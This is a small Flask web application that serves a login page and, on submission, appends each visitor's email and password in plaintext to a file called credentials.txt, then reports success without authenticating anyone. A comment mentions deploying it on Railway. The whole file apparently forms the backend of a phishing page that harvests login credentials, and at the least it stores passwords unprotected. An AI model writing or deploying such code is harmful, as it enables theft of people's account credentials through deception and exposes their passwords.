from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Save to a text file (will not work on Railway, just for local testing)
    with open("credentials.txt", "a") as f:
        f.write(f"{email} | {password}\n")
    
    return "Login submitted successfully!"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
